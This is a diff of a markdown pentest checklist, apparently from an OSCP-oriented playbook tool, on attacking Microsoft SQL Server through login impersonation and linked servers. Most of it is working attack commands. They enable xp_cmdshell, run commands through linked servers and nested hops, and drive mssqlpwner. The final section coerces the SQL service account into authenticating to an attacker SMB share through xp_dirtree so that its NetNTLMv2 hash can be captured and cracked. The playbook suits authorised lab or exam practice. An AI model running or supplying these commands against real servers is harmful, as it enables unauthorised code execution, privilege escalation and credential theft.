@@ -1,48 +1,54 @@
-# MSSQL impersonation & links
+# MSSQL impersonation and links
 
 ## Before I start
-- [ ] Connected with whatever I have — guest SQL auth, reused password, domain user: :Pb mssql
-impacket-mssqlclient <Domain>/<User>:'<Password>'@<Host> -windows-auth
+- [ ] Connected with whatever I have, a guest SQL login, a reused password or a domain user: :Pb mssql
+At the pwn-broker prompt: tool install impacket.
+impacket-mssqlclient '<Domain>/<Username>:<Password>@<TargetIP>' -windows-auth
 
-## Who can I impersonate
+## Who I can impersonate
 SELECT DISTINCT b.name FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
 SELECT SYSTEM_USER;
 SELECT IS_SRVROLEMEMBER('sysadmin');
-- [ ] sa or any privileged login in the list: impersonate straight up
-- [ ] Nobody listed: go look at the links FIRST, re-run this check on each link
+- [ ] sa or another privileged login in the list: impersonated directly, as <TargetUser>
+- [ ] Nobody listed: the links first, with this check run again on each one
 
 ## Become them
-EXECUTE AS LOGIN = 'sa';
+EXECUTE AS LOGIN = '<TargetUser>';
 EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 EXEC xp_cmdshell 'whoami';
-- [ ] Shell lands as the SQL SERVICE account — check its domain rights, they are rarely small
-- [ ] Automation instead: msf auxiliary/admin/mssql/mssql_escalate_execute_as (db_owner variant: mssql_escalate_dbowner)
+- [ ] The commands run as the SQL service account: its rights in the domain checked, since they are rarely small
+- [ ] Metasploit does it too: auxiliary/admin/mssql/mssql_escalate_execute_as, and mssql_escalate_dbowner for a db_owner
+- [ ] OSCP one-target limit: this Metasploit auxiliary module spends my one target, even if it fails
 
-## Links: what does this server trust
+## Links: what this server trusts
 EXEC sp_linkedservers;
 SELECT * FROM master..sysservers;
-SELECT * FROM OPENQUERY("SQL2", 'SELECT SYSTEM_USER');
-- [ ] The link's login on the far side is usually MORE privileged than mine here — that is the privesc
-- [ ] Whole chain mapped from a Windows host: Get-SQLServerLinkCrawl -Instance <Host> -Verbose
+With THE-LINKED-SERVER a name from that list:
+SELECT * FROM OPENQUERY([THE-LINKED-SERVER], 'SELECT SYSTEM_USER');
+- [ ] The link's login on the far side often has more rights than mine here: that is the escalation
+- [ ] The whole chain mapped from a Windows host with PowerUpSQL, https://github.com/NetSPI/PowerUpSQL: Get-SQLServerLinkCrawl -Instance <TargetIP> -Verbose
 
-## Command execution through a link
-EXECUTE('sp_configure ''show advanced options'',1; reconfigure;') AT "SQL2";
-EXECUTE('sp_configure ''xp_cmdshell'',1; reconfigure;') AT "SQL2";
-EXECUTE('exec master..xp_cmdshell ''whoami''') AT "SQL2";
-- [ ] OPENQUERY can't run procedures: EXECUTE(...) AT is the form — and every nesting level DOUBLES the single quotes
-- [ ] Second hop: SELECT * FROM OPENQUERY("SQL1", 'SELECT * FROM OPENQUERY("SQL2", ''exec xp_cmdshell ''''whoami''''''')');
+## Commands through a link
+EXECUTE('sp_configure ''show advanced options'',1; reconfigure;') AT [THE-LINKED-SERVER];
+EXECUTE('sp_configure ''xp_cmdshell'',1; reconfigure;') AT [THE-LINKED-SERVER];
+EXECUTE('exec master..xp_cmdshell ''whoami''') AT [THE-LINKED-SERVER];
+- [ ] OPENQUERY cannot run a procedure, so EXECUTE(...) AT is the form, and each level of nesting doubles the single quotes
+- [ ] A second hop, through THE-LINKED-SERVER to THE-SECOND-LINK: SELECT * FROM OPENQUERY([THE-LINKED-SERVER], 'SELECT * FROM OPENQUERY([THE-SECOND-LINK], ''exec xp_cmdshell ''''whoami'''''')');
 
-## From Kali with mssqlpwner
-mssqlpwner <Domain>/<User>:<Password>@<Host> -windows-auth -max-impersonation-depth 2 interactive
-mssqlpwner <Domain>/<User>:<Password>@<Host> -windows-auth -link-name SQL2 exec hostname
-- [ ] interactive: enum_links, use_link [NAME], then impersonation checks again at the new hop
+## From Kali, with mssqlpwner
+mssqlpwner, after sudo apt install -y mssqlpwner:
+mssqlpwner '<Domain>/<Username>:<Password>@<TargetIP>' -windows-auth -max-impersonation-depth 2 interactive
+mssqlpwner '<Domain>/<Username>:<Password>@<TargetIP>' -windows-auth -link-name THE-LINKED-SERVER exec hostname
+- [ ] In interactive: get-chain-list shows each route through links and impersonation, and set-chain or set-link-server picks one
 
-## The companion move: steal the service account's hash
-EXEC xp_dirtree '\\<AttackerIP>\share';
-- [ ] Responder catches the SQL service account's Net-NTLMv2: :Pb responder
-- [ ] Or relay it: :Pb ntlm-relay
+## The service account's hash
+The non-poisoning SMB listener from :Pb responder:
+sudo /opt/pwn-broker/bin/impacket-smbserver share . -smb2support
+EXEC master..xp_dirtree '\\<LHOST>\share';
+- [ ] The listener prints the service account's NetNTLMv2 response, to crack: :Pb responder
+- [ ] Not on the OSCP exam: relaying a captured response is kept out as a safe reading; OffSec's pages do not name relay
 
 ## Next
-- [ ] Service account cred/hash tested across the domain: :Pb lateral-movement
-- [ ] Service account has an SPN (it does — it's MSSQL): roast it for the password: :Pb kerberoasting
+- [ ] The service account's password or hash tried across the domain: :Pb lateral-movement
+- [ ] The service account has an SPN, since it runs MSSQL: roasted for its password, :Pb kerberoasting
